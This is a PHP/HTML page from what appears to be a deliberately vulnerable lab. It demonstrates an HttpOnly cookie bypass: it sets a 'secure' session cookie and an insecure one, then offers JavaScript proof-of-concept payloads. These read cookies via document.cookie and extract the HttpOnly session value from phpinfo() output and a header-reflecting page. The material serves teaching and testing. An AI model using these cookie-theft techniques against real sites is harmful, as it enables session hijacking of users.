<html>
    <head>
        <?php
            setcookie("User_Session", "sup3rs3cr3t", time()+9600, "/", "127.0.0.1", 1, 1);
            setcookie("Insecure_Cookie", "im_insecure", time()+9600, "/", "127.0.0.1", 0, 0);
        ?>
        <script>
            function classic(){
                console.log("Document Cookies: "+document.cookie);
            }
            function phpinfo(){
                //This makes a HTTP request from the browser to phpinfo.php and performs a regex for the User_Session string then logs it to the console. 
                fetch("/vuln/phpinfo.php").then(response => response.text()).then(data => console.log("Document Cookie: "+data.match(/User_Session=([a-zA-Z0-9_.-]+)/)[1]));

            }
            function reflection(){
                //This is similar to the above, however in this instance because the "developer" implements URL encoding on bad_reflection.php we decode it before performing the regex, matter of choice.
                fetch("/vuln/bad_reflection.php").then(response => response.text()).then(data => console.log("Document Cookie: "+decodeURIComponent(data).match(/User_Session=([a-zA-Z0-9_.-]+)/)[1]));
            }
        </script>
    </head>
    <title>HTTP Only</title><b><u>NOTE: This page sets the <i>User_Session</i> cookie with the HttpOnly and Secure attributes. It also creates <i>Insecure_Cookie</i> which is set without the HttpOnly and the Secure flag</u></b>
    <body>
        <!-- Navigation links -->
        <pre><h1>Navigation links</h1></pre>
        <p>Below is an example of how phpinfo() reads from the cookie header.</p>
        <p><a href="/vuln/phpinfo.php">View phpinfo()</a><p>
        <p>Below is an example of how reading and displaying the cookie header is bad.</p>
        <a href="/vuln/bad_reflection.php">View reflection</a>
        <!-- Proof Of Concepts -->
        <pre><h1>Exploiting It</h1></pre>
        As a proof of concept this ships with some pre-built XSS payloads (yay!) <b>Open the JavaScript console to see output for the below:</b><br>
        <p>Try reading the cookie through the classic <b><code>document.cookie()</code></b> method:</p>
        <a href="javascript:classic()">document.cookie()</a>
        <p>Read the cookie through <b><code>phpinfo()</code></b>:</p>
        <a href="javascript:phpinfo()">phpinfo()</a>
        <p>Read the cookie through <b><code>webpage reflection</code></b>:</p>
        <a href="javascript:reflection()">getallheaders()</a>
    </body>
</html>